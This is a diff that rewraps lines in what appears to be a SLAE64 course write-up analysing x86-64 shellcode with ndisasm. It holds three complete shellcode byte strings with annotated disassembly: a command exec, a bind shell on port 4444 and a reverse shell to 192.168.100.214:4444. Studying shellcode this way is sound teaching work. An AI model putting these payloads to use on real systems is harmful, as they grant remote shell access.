@@ -36,7 +36,9 @@ root@whitecr0wz:~#
 ##### Ndisasm
 
 ```term
-root@whitecr0wz:~# echo -ne "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x6c\x73\x00\x56\x57\x48\x89\xe6\x0f\x05" | ndisasm -u - -b 64 
+root@whitecr0wz:~# echo -ne 
+"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x6c\x73\x00\x56\x57\x48\x89
+\xe6\x0f\x05" | ndisasm -u - -b 64 
 00000000  6A3B              push byte +0x3b                         ; Pushes 59 (execve syscall value) into the stack.
 00000002  58                pop rax                                 ; Pops this value into RAX.
 00000003  99                cdq                                     ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
@@ -150,7 +152,10 @@ root@whitecr0wz:~#
 ##### Ndisasm
 
 ```term
-whitecr0wz@SLAE64:~/assembly/assignments/Assignment_5/dissect2$ echo -ne "\x6A\x29\x58\x99\x6A\x02\x5F\x6A\x01\x5E\x0F\x05\x48\x97\x52\xC7\x04\x24\x02\x00\x11\x5C\x48\x89\xE6\x6A\x10\x5A\x6A\x31\x58\x0F\x05\x6A\x32\x58\x0F\x05\x48\x31\xF6\x6A\x2B\x58\x0F\x05\x48\x97\x6A\x03\x5E\x48\xFF\xCE\x6A\x21\x58\x0F\x05\x75\xF6\x6A\x3B\x58\x99\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x52\x57\x48\x89\xE6\x0F\x05" | ndisasm -u - -b 64 
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_5/dissect2$ echo -ne 
+"\x6A\x29\x58\x99\x6A\x02\x5F\x6A\x01\x5E\x0F\x05\x48\x97\x52\xC7\x04\x24\x02\x00\x11\x5C\x48\x89\xE6\x6A\x10\x5A\x6A\x31\x58\x0F\x05\x6A\x32\x58\x0F\x05\x48\x31\xF6\x6A\x2B\x58
+\x0F\x05\x48\x97\x6A\x03\x5E\x48\xFF\xCE\x6A\x21\x58\x0F\x05\x75\xF6\x6A\x3B\x58\x99\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x52\x57\x48\x89\xE6\x0F\x05" | 
+ndisasm -u - -b 64 
 00000000  6A29              push byte +0x29                   ; Pushes syscall value 41 (value of the socket syscall) into the stack.        
 00000002  58                pop rax                           ; Pops this value into RAX.
 00000003  99                cdq                               ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
@@ -160,7 +165,8 @@ whitecr0wz@SLAE64:~/assembly/assignments/Assignment_5/dissect2$ echo -ne "\x6A\x
 00000009  5E                pop rsi                           ; Pops this value into RSI. This will grant RSI with SOCK_STREAM, satisfying the *type* argument.
 0000000A  0F05              syscall                           ; Executes the syscall.
 0000000C  4897              xchg rax,rdi                      ; Exchanges the value between RAX and RDI. This saves the value in RDI for sockfd operations.
-0000000E  52                push rdx                          ; Pushes the value of RDX. As it is a NULL, the NULL-DWORD is pushed as a 0, which is an argument of the const struct addr.
+0000000E  52                push rdx                          ; Pushes the value of RDX. As it is a NULL, the NULL-DWORD is pushed as a 0, which is an argument of the const 
+                                                              ; struct addr.
 0000000F  C704240200115C    mov dword [rsp],0x5c110002        ; Pushes 4444 in hex into the stack. However, as 4444 is not big enough for RSP, a few NULLs are parsed.
 00000016  4889E6            mov rsi,rsp                       ; The value of RSP is copied into RSI.
 00000019  6A10              push byte +0x10                   ; The value "16" is pushed into the stack.
@@ -182,7 +188,8 @@ whitecr0wz@SLAE64:~/assembly/assignments/Assignment_5/dissect2$ echo -ne "\x6A\x
 00000036  6A21              push byte +0x21                   ; Pushes syscall value 33 (value of the dup2 syscall) into the stack.  
 00000038  58                pop rax                           ; Pops this value into RAX.
 00000039  0F05              syscall                           ; Executes the syscall.
-0000003B  75F6              jnz 0x33                          ; Jump if the Zero flag (ZF) hasn't been set. This means that until RSI doesn't hit zero (through the dec rsi instruction), the loop will not stop.
+0000003B  75F6              jnz 0x33                          ; Jump if the Zero flag (ZF) hasn't been set. This means that until RSI doesn't hit zero (through the dec rsi 
+                                                              ; instruction), the loop will not stop.
 0000003D  6A3B              push byte +0x3b                   ; Pushes syscall value 59 (value of the execve syscall) into the stack.  
 0000003F  58                pop rax                           ; Pops this value into RAX.
 00000040  99                cdq                               ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
@@ -223,7 +230,9 @@ root@whitecr0wz:~#
 ##### Ndisasm
 
 ```term
-root@whitecr0wz:~# echo -ne "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x11\x5c\xc0\xa8\x64\xd6\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05" | ndisasm -u - -b 64 
+root@whitecr0wz:~# echo -ne 
+"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x11\x5c\xc0\xa8\x64\xd6\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21
+\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05" | ndisasm -u - -b 64 
 00000000  6A29              push byte +0x29                   ; Pushes syscall value 41 (value of the socket syscall) into the stack.   
 00000002  58                pop rax                           ; Pops this value into RAX.
 00000003  99                cdq                               ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
@@ -233,7 +242,8 @@ root@whitecr0wz:~# echo -ne "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x4
 00000009  5E                pop rsi                           ; Pops this value into RSI. This will grant RSI with SOCK_STREAM, satisfying the *type* argument.
 0000000A  0F05              syscall                           ; Executes the syscall.
 0000000C  4897              xchg rax,rdi                      ; Exchanges the value between RAX and RDI. This is done in order to satisfy further sockfd arguments.
-0000000E  48B90200115CC0A8  mov rcx,0xd664a8c05c110002        ; Pushes "192.168.100.214:4444" within the hex format in reverse. Furthermore, as this string is not long enough to fulfill RCX, additional nulls are parsed.
+0000000E  48B90200115CC0A8  mov rcx,0xd664a8c05c110002        ; Pushes "192.168.100.214:4444" within the hex format in reverse. Furthermore, as this string is not long enough to 
+                                                              ; fulfill RCX, additional nulls are parsed.
          -64D6
 00000018  51                push rcx                          ; RCX is pushed into the stack.
 00000019  4889E6            mov rsi,rsp                       ; The value of RSP is copied into RSI.
@@ -248,7 +258,8 @@ root@whitecr0wz:~# echo -ne "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x4
 0000002A  6A21              push byte +0x21                   ; Pushes syscall value 33 (value of the socket dup2) into the stack.
 0000002C  58                pop rax                           ; Pops this value into RAX.
 0000002D  0F05              syscall                           ; Executes the syscall.
-0000002F  75F6              jnz 0x27                          ; Jump if the Zero flag (ZF) hasn't been set. This means that until RSI doesn't hit zero (through the dec rsi instruction), the loop will not stop.
+0000002F  75F6              jnz 0x27                          ; Jump if the Zero flag (ZF) hasn't been set. This means that until RSI doesn't hit zero (through the dec rsi 
+                                                              ; instruction), the loop will not stop.
 00000031  6A3B              push byte +0x3b                   ; Pushes syscall value 59 (value of the execve syscall) into the stack.
 00000033  58                pop rax                           ; Pops this value into RAX.
 00000034  99                cdq                               ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
@@ -262,7 +273,8 @@ root@whitecr0wz:~# echo -ne "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x4
 00000048  0F05              syscall                           ; Executes the syscall.
 ```
 
-Once again, there isn't much to comment, as most of the important explanation has been done through the comments. It simply is a reverse-shell that arranges a connection towards the local address in port 4444.
+Once again, there isn't much to comment, as most of the important explanation has been done through the comments. It simply is a reverse-shell that arranges a connection towards 
+the local address in port 4444.
 
 ### Code
 
